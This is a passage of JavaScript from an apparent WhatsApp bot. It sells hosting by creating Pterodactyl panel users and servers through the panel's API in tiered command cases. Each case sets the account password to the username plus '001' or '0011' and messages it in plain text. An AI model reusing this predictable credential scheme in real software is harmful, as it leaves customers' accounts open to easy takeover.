let d = (await Biiofc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "0011"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}
⎙─➤ *😎PEMILIK SERVER* : *${namaCreator}*


NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
Biiofc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: Biiofc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}
minSaldo(sender, 12000, db_saldo)
break
case "srvpaket8": {
       if (cekSaldo(sender,db_saldo) < 13000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp13.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "By Rafathar"
let egg = global.eggsnya
let loc = global.location
let memo = "7000"
let cpu = "400"
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/45b3f02531a5a32793366.jpg" 
if (!u) return
let d = (await Biiofc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "0011"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}
⎙─➤ *😎PEMILIK SERVER* : *${namaCreator}*


NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
Biiofc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: Biiofc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}
minSaldo(sender, 13000, db_saldo)
break
case "srvpaket9": {
       if (cekSaldo(sender,db_saldo) < 14000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp14.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "By Rafathar"
let egg = global.eggsnya
let loc = global.location
let memo = "8000"
let cpu = "450"
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/45b3f02531a5a32793366.jpg" 
if (!u) return
let d = (await Biiofc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "0011"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}
⎙─➤ *😎PEMILIK SERVER* : *${namaCreator}*


NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
Biiofc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: Biiofc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}
minSaldo(sender, 14000, db_saldo)
break
case "srvpaket10": {
       if (cekSaldo(sender,db_saldo) < 15000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp15.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "By Rafathar"
let egg = global.eggsnya
let loc = global.location
let memo = "9000"
let cpu = "500"
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/45b3f02531a5a32793366.jpg" 
if (!u) return
let d = (await Biiofc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "0011"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}
⎙─➤ *😎PEMILIK SERVER* : *${namaCreator}*


NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
Biiofc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: Biiofc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}
minSaldo(sender, 15000, db_saldo)
break
case "1gbb": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (!isPremiumm && !isOwner) return reply(mess.only.premiumm)

let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "Reguler"
let egg = global.eggsnya
let loc = global.location
let memo = "1024"
let cpu = "10"
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/45b3f02531a5a32793366.jpg" 
if (!u) return
let d = (await Biiofc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domainn + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domainn + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy
}
})
reply(`DONE BY SanZ Offcial⚡

 *DONE CRATE USER + SERVER ID :* ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

 *👤USERNAME* : ${user.username}
 *🔐PASSWORD* : ${password}
 *🌐LOGIN* : ${domainn}
 *😎PEMILIK SERVER* : *${namaCreator}*
 

NOTE :
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
`
Biiofc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: Biiofc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domainn + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`
𝐃𝐎𝐍𝐄 𝐒𝐈𝐋𝐀𝐇𝐊𝐀𝐍 𝐂𝐄𝐊 𝐃𝐀𝐓𝐀 𝐀𝐊𝐔𝐍 𝐏𝐀𝐍𝐄𝐋 𝐀𝐍𝐃𝐀 𝐒𝐔𝐃𝐀𝐇 𝐓𝐄𝐑𝐊𝐈𝐑𝐈𝐌 𝐊𝐄 𝐍𝐎𝐌𝐎𝐑 𝐓𝐄𝐑𝐒𝐄𝐁𝐔𝐓 ☑️
© Cs SanZOffcial
`)

}

break
case "2gb": {
if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "Reguler"
let egg = global.eggsnya
let loc = global.location
let memo = "2048"
let cpu = "200"
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/45b3f02531a5a32793366.jpg" 
if (!u) return
let d = (await Biiofc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}
⎙─➤ *😎PEMILIK SERVER* : *${namaCreator}*


NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
Biiofc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: Biiofc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "3gb": {
if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "Reguler"
let egg = global.eggsnya
let loc = global.location
let memo = "3072"
let cpu = "300"
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/45b3f02531a5a32793366.jpg" 
if (!u) return
let d = (await Biiofc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}
⎙─➤ *😎PEMILIK SERVER* : *${namaCreator}*


NOTE :
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
Biiofc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: Biiofc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*

TYPE: user

ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}
break
case "4gb": {
    if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "Reguler"
let egg = global.eggsnya
let loc = global.location
let memo = "4048"
let cpu = "200"
let disk = "4000"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/45b3f02531a5a32793366.jpg" 
if (!u) return
let d = (await Biiofc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}
⎙─➤ *😎PEMILIK SERVER* : *${namaCreator}*


NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
Biiofc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: Biiofc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "unli": {
    if (!isPremium && !isOwner) return reply(mess.only.premium)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "Premium"
let egg = global.eggsnya
let loc = global.location
let memo = "0"
let cpu = "0"
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/45b3f02531a5a32793366.jpg" 
if (!u) return
let d = (await Biiofc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}
⎙─➤ *😎PEMILIK SERVER* : *${namaCreator}*


NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
Biiofc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: Biiofc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "5gb": {
if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "Reguler"
let egg = global.eggsnya
let loc = global.location
let memo = "5138"
let cpu = "500"
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/45b3f02531a5a32793366.jpg" 
if (!u) return
let d = (await Biiofc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "0011"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
